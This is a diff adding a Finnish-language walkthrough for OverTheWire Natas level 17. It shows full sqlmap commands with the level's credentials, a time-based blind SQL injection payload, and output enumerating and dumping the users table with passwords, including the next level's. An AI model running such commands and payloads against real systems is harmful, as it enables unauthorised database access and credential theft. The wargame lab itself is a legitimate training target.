@@ -230,6 +230,288 @@ Username kenttään lomakkeelle ainakin kokeilin muutamia vaihtoehtoja, mutta ni
 ![alt text](./kuvat-level16-20/natas17-3.png)
 
 
+# Natas 17 - 2 - Kali Linux - START HERE;
+
+natas17 : EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
+
+## SQLMAP - START HERE
+
+Tämä komento sama kuin aikaisempi, muttam uokattuna ja pitää vähä editoida
+
+Käytä time-based blind injectionia, ja anna SQLMapin itse testata viiveitä:
+
+```
+┌──(kali㉿kali)-[~]
+└─$ sqlmap -u "http://natas17.natas.labs.overthewire.org/index.php" \
+--auth-type=Basic \
+--auth-cred=natas17:EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC \
+--data="username=natas18" \
+--technique=T --time-sec=5 \
+--level=5 --risk=3
+        ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.8.5#stable}
+|_ -| . [']     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 19:06:48 /2025-05-21/
+
+[19:06:49] [INFO] testing connection to the target URL
+[19:07:00] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
+[19:07:00] [INFO] testing for SQL injection on POST parameter 'username'
+[19:07:00] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[19:07:00] [WARNING] time-based comparison requires larger statistical model, please wait............................ (done)
+[19:07:44] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
+[19:07:48] [INFO] checking if the injection point on POST parameter 'username' is a false positive
+POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
+[19:09:18] [WARNING] heuristic (basic) test shows that parameter 'User-Agent' might not be injectable
+[19:09:18] [INFO] testing for SQL injection on parameter 'User-Agent'
+[19:09:18] [WARNING] parameter 'User-Agent' does not seem to be injectable
+[19:09:18] [WARNING] heuristic (basic) test shows that parameter 'Referer' might not be injectable
+[19:09:18] [INFO] testing for SQL injection on parameter 'Referer'
+[19:09:19] [WARNING] parameter 'Referer' does not seem to be injectable
+[19:09:19] [WARNING] heuristic (basic) test shows that parameter 'Host' might not be injectable
+[19:09:19] [INFO] testing for SQL injection on parameter 'Host'
+[19:09:19] [WARNING] parameter 'Host' does not seem to be injectable
+sqlmap identified the following injection point(s) with a total of 89 HTTP(s) requests:
+---
+Parameter: username (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=natas18" AND (SELECT 5495 FROM (SELECT(SLEEP(5)))SXXu) AND "vuKd"="vuKd
+---
+[19:09:19] [INFO] the back-end DBMS is MySQL
+[19:09:19] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.58
+back-end DBMS: MySQL >= 5.0.12
+[19:09:19] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/natas17.natas.labs.overthewire.org'                                                                                                                
+[19:09:19] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 19:09:19 /2025-05-21/
+```
+
+Tuloksena kertoi on onnistunut ja kohde on haavoittuvua SQL injektio just kyseisen **time-based blind sql injectiolle** (ylempi tulos)
+
+
+## 📥 Mitä seuraavaksi?
+Seuraavaksi aloin suorittaa samoja tai kaltaista komentoa, joka suoriutui samanlailla kuin level 14 ja 15:ssa, että pieni lunttilappuna, mutta silti tämän **SQLmap** injektion komentoa pitää rakentaa tarkasti, että mitä halutaan toistaa.
+
+1️⃣ Listata tietokannan taulut:
+
+```
+┌──(kali㉿kali)-[~]
+└─$ sqlmap -u "http://natas17.natas.labs.overthewire.org/index.php" \
+--auth-type=Basic \
+--auth-cred=natas17:EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC \
+--data="username=natas18" \
+--technique=T --time-sec=5 \
+--level=5 --risk=3 \
+--tables -D natas17
+        ___
+       __H__                                                                                                              
+ ___ ___[,]_____ ___ ___  {1.8.5#stable}                                                                                  
+|_ -| . ["]     | .'| . |                                                                                                 
+|___|_  [(]_|_|_|__,|  _|                                                                                                 
+      |_|V...       |_|   https://sqlmap.org                                                                              
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 19:12:32 /2025-05-21/
+
+[19:12:32] [INFO] resuming back-end DBMS 'mysql' 
+[19:12:32] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=natas18" AND (SELECT 5495 FROM (SELECT(SLEEP(5)))SXXu) AND "vuKd"="vuKd
+---
+[19:12:32] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.58
+back-end DBMS: MySQL >= 5.0.12
+[19:12:32] [INFO] fetching tables for database: 'natas17'
+[19:12:32] [INFO] fetching number of tables for database 'natas17'
+[19:12:32] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
+[19:12:36] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
+1
+[19:12:42] [INFO] retrieved: users
+Database: natas17
+[1 table]
++-------+
+| users |
++-------+
+
+[19:13:59] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/natas17.natas.labs.overthewire.org'                                                                                                                
+[19:13:59] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 19:13:59 /2025-05-21/
+```
+
+
+2️⃣ Näyttää sarakkeet users-taulusta:
+Tässä tuli pieni fail, koska siinä alkoi mennä kauemmin , mutta siksi kolmas steppissä meni paremmaksi (miksi, vastaus on alhaalla 3.)
+
+```
+┌──(kali㉿kali)-[~]
+└─$ sqlmap -u "http://natas17.natas.labs.overthewire.org/index.php" \
+--auth-type=Basic \
+--auth-cred=natas17:EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC \
+--data="username=natas18" \
+--technique=T --time-sec=5 \
+--level=5 --risk=3 \
+--column -D natas17 -T users    
+        ___
+       __H__                                                                                                              
+ ___ ___["]_____ ___ ___  {1.8.5#stable}                                                                                  
+|_ -| . [)]     | .'| . |                                                                                                 
+|___|_  [,]_|_|_|__,|  _|                                                                                                 
+      |_|V...       |_|   https://sqlmap.org                                                                              
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 19:23:13 /2025-05-21/
+
+[19:23:14] [INFO] resuming back-end DBMS 'mysql' 
+[19:23:14] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=natas18" AND (SELECT 5495 FROM (SELECT(SLEEP(5)))SXXu) AND "vuKd"="vuKd
+---
+[19:23:14] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.58
+back-end DBMS: MySQL >= 5.0.12
+[19:23:14] [INFO] fetching columns for table 'users' in database 'natas17'
+[19:23:14] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
+[19:23:16] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
+[19:23:41] [ERROR] invalid character detected. retrying..
+2
+[19:24:20] [ERROR] invalid character detected. retrying..
+
+[19:24:20] [INFO] retrieved: 
+[19:24:48] [ERROR] invalid character detected. retrying..
+u
+[19:26:22] [ERROR] invalid character detected. retrying..
+sernam
+[19:27:58] [ERROR] invalid character detected. retrying..
+[19:28:39] [ERROR] invalid character detected. retrying..
+e
+[19:28:50] [INFO] retrieved: v
+[19:29:53] [ERROR] invalid character detected. retrying..
+archar(64)
+[19:32:41] [INFO] retrieved: 
+[19:33:13] [ERROR] invalid character detected. retrying..
+pas
+[19:34:54] [ERROR] invalid character detected. retrying..
+sword
+[19:36:23] [INFO] retrieved: va
+[19:37:36] [ERROR] invalid character detected. retrying..
+r
+[19:38:33] [ERROR] invalid character detected. retrying..
+cha
+[19:39:52] [ERROR] invalid character detected. retrying..
+r
+[19:40:43] [ERROR] invalid character detected. retrying..
+(6
+[19:41:49] [ERROR] invalid character detected. retrying..
+4^C
+
+[19:42:31] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 19:42:31 /2025-05-21/
+```
+
+Tämä on normaalia tällaisissa hyökkäyksissä, koska:
+- Palvelin ei anna suoraa vastausta
+- SQLMap tekee yksi merkki kerrallaan, viiveellä useita HTTP-pyyntöjä
+- Lisäksi verkkoyhteys, palvelimen kuorma tai noise voi aiheuttaa virhei
+
+3️⃣ Hakea tiedot (esim. käyttäjät + salasanat):
+Tässä nyt alkoi pelittää, koska nyt haettiin `users` tietoja tuolta taulusta, että dumppataan sitä tietoa ulos ja aika meni tosi pitkään, mutta se on sitä kärsivällsiyyttää. Kuitenkin **SQLmap** on yksi tapa selvittää sitä tietokannan prosessia, mutta tänne leveliin tulee muita keinoa ja tapaa selvittää.
+
+```
+┌──(kali㉿kali)-[~]
+└─$ sqlmap -u "http://natas17.natas.labs.overthewire.org/index.php" \
+--auth-type=Basic \
+--auth-cred=natas17:EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC \
+--data="username=natas18" \
+--technique=T --time-sec=5 \
+--level=5 --risk=3 \
+--dump -T users -D natas17
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.8.5#stable}
+|_ -| . ["]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 19:43:59 /2025-05-21/
+
+[19:43:59] [INFO] resuming back-end DBMS 'mysql' 
+[19:43:59] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=natas18" AND (SELECT 5495 FROM (SELECT(SLEEP(5)))SXXu) AND "vuKd"="vuKd
+---
+[19:44:00] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.58
+back-end DBMS: MySQL >= 5.0.12
+[19:44:00] [INFO] fetching columns for table 'users' in database 'natas17'
+[19:44:00] [INFO] resumed: 2
+[19:44:00] [INFO] resumed: username
+[19:44:00] [INFO] resumed: password
+[19:44:00] [INFO] fetching entries for table 'users' in database 'natas17'
+[19:44:00] [INFO] fetching number of entries for table 'users' in database 'natas17'
+[19:44:00] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
+[19:44:08] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
+4
+[19:44:09] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)
+0xjsNNj
+[19:47:48] [ERROR] invalid character detected. retrying..
+GvHkb7p
+[19:51:14] [ERROR] invalid character detected. retrying..
+wgC6PrAyLNT0pYCqHd
+[19:58:02] [INFO] retrieved: user1
+[19:59:12] [INFO] retrieved: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
+[20:10:11] [INFO] retrieved: natas18
+[20:11:51] [INFO] retrieved: MeYdu6MbjewqcokG0kD4LrSsUZtfxOQ2
+[20:22:42] [INFO] retrieved: user2
+[20:23:57] [INFO] retrieved: VOFWy9nHX9WUMo9Ei9WVKh8xLP1mrHKD
+[20:35:24] [INFO] retrieved: user3
+Database: natas17
+Table: users
+[4 entries]
++----------------------------------+----------+
+| password                         | username |
++----------------------------------+----------+
+| 0xjsNNjGvHkb7pwgC6PrAyLNT0pYCqHd | user1    |
+| 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ | natas18  |
+| MeYdu6MbjewqcokG0kD4LrSsUZtfxOQ2 | user2    |
+| VOFWy9nHX9WUMo9Ei9WVKh8xLP1mrHKD | user3    |
++----------------------------------+----------+
+
+[20:36:44] [INFO] table 'natas17.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/natas17.natas.labs.overthewire.org/dump/natas17/users.csv'                                                                                        
+[20:36:44] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/natas17.natas.labs.overthewire.org'                                                                                                                
+[20:36:44] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 20:36:44 /2025-05-21/
+```
 
 
 
